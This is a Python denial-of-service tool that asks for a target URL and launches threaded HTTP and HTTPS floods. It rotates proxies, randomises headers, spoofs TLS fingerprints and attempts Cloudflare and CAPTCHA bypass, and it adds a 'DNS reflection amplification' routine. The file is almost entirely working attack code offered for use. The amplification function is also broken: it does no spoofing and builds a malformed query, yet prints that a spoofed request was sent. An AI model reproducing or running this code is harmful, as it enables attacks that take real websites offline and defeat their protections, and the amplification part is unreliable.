import requests
import threading
import time
from urllib.parse import urlparse
import http.client
import socket
import cloudscraper
from core_functions import load_proxies, get_random_proxy, generate_polymorphic_headers, create_tls_fingerprint_context, solve_captcha

# HTTPS Multiplexed Flooding with JA3 fingerprinting and proxy rotation
def https_multiplexed_flood(target_url, time_limit, rate, proxies):
    """HTTPS Flood attack using multiplexed HTTP/2 over TLS with JA3 fingerprinting."""
    end_time = time.time() + time_limit
    parsed_url = urlparse(target_url)
    host = parsed_url.hostname
    path = parsed_url.path if parsed_url.path else '/'

    proxy = get_random_proxy(proxies)  # Select a random proxy for each request

    try:
        conn = http.client.HTTPSConnection(host, context=create_tls_fingerprint_context())  # Use custom TLS context
        if proxy:
            print(f"[INFO] Using Proxy: {proxy['https']}")

        while time.time() < end_time:
            for _ in range(rate):
                conn.request("GET", path, headers=generate_polymorphic_headers())
                response = conn.getresponse()
                response.read()  # Read response to complete the request
                print(f"[HTTPS Multiplex] Request sent to {host}, Status Code: {response.status}")
            time.sleep(0.1)
    except Exception as e:
        print(f"[ERROR] HTTPS Multiplex flooding failed: {e}")
    finally:
        conn.close()

# HTTP Flood with Polymorphic Headers and CAPTCHA Solving
def http_flood_polymorphic_with_sessions(target_url, time_limit, rate, proxies):
    """HTTP Flood attack with Cloudflare bypass, CAPTCHA handling, and cookie session management."""
    end_time = time.time() + time_limit

    # Create a CloudScraper session to handle Cloudflare protections
    scraper = cloudscraper.create_scraper()

    # Initial request to get cookies and possibly solve CAPTCHA if required
    try:
        initial_response = scraper.get(target_url)
        cookies = initial_response.cookies  # Store cookies for future use

        # Check if CAPTCHA is present
        if 'cf_captcha_kind' in initial_response.text:
            print("[INFO] CAPTCHA detected. Attempting to solve.")
            site_key = "your-site-key-here"  # Replace with actual site key or extract from page source
            captcha_solution = solve_captcha(site_key, target_url)
            if captcha_solution:
                print("[INFO] CAPTCHA solved. Proceeding with attack.")
                cookies.set('g-recaptcha-response', captcha_solution)
            else:
                print("[ERROR] Failed to solve CAPTCHA. Attack aborted.")
                return
    except requests.RequestException as e:
        print(f"[ERROR] Initial request failed: {e}")
        return

    while time.time() < end_time:
        headers = generate_polymorphic_headers()
        proxy = get_random_proxy(proxies)  # Randomly select a proxy for each request

        try:
            for _ in range(rate):
                response = scraper.get(target_url, headers=headers, proxies=proxy, cookies=cookies, timeout=5)
                print(f"[HTTP Flood] Request sent: Status {response.status_code}")
        except requests.RequestException as e:
            print(f"[ERROR] Request failed: {e}")
        time.sleep(1 / rate)

# DNS over HTTPS (DoH) Resolver
def resolve_doh(domain):
    """Resolve domain using DNS-over-HTTPS (DoH) for enhanced anonymity."""
    DOH_RESOLVER_URL = 'https://dns.google/resolve?name='
    try:
        response = requests.get(f"{DOH_RESOLVER_URL}{domain}")
        data = response.json()
        return data['Answer'][0]['data']
    except Exception as e:
        print(f"[ERROR] DoH resolution failed: {e}")
        return None

# DNS Reflection Amplification Attack with Amplification Vector
def reflection_amplification(target_ip, domain, resolver_ip):
    """Perform a DNS reflection amplification attack."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)

    # DNS query in binary format for amplification
    query = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + bytes(domain, 'utf-8') + b"\x00\x00\xff\x00\x01"

    try:
        # Send the spoofed request to the DNS resolver (Open DNS Resolver)
        sock.sendto(query, (resolver_ip, 53))
        response = sock.recvfrom(4096)  # Expect a large response due to amplification
        print(f"[DNS Amplification] Sent spoofed request to DNS resolver {resolver_ip} for target {target_ip}")
    except Exception as e:
        print(f"[ERROR] DNS Amplification failed: {e}")

# Run the attack based on user input
def run_attack(target_url, attack_type, time_limit, thread_count, rate, proxies):
    """Main attack function that manages threads for different attack types."""
    threads = []

    if attack_type == 'polymorphic':
        attack_func = lambda: http_flood_polymorphic_with_sessions(target_url, time_limit, rate, proxies)
    elif attack_type == 'multiplex':
        attack_func = lambda: https_multiplexed_flood(target_url, time_limit, rate, proxies)
    elif attack_type == 'reflection':
        domain = urlparse(target_url).hostname
        target_ip = resolve_doh(domain) or target_url  # Resolve target IP with DoH
        attack_func = lambda: reflection_amplification(target_ip, domain, '8.8.8.8')  # Google's DNS resolver

    for _ in range(thread_count):
        thread = threading.Thread(target=attack_func)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

# Main function to get user input and start the attack
def main():
    target = input("Target URL (http/https): ")
    attack_time = int(input("Attack duration (seconds): "))
    threads = int(input("Number of threads: "))
    rate = int(input("Requests per second per thread: "))

    proxies = load_proxies()

    print("\nChoose attack type:")
    print("[1] HTTP Flood with Polymorphic Headers")
    print("[2] HTTPS Multiplexed Flooding")
    print("[3] DNS Reflection Amplification")
    attack_choice = input("Select attack type (1, 2, or 3): ")

    attack_type = 'polymorphic' if attack_choice == '1' else 'multiplex' if attack_choice == '2' else 'reflection'

    print(f"\n[INFO] Launching attack on {target} for {attack_time} seconds with {threads} threads and {rate} requests/second.")
    run_attack(target, attack_type, attack_time, threads, rate, proxies)

if __name__ == "__main__":
    main()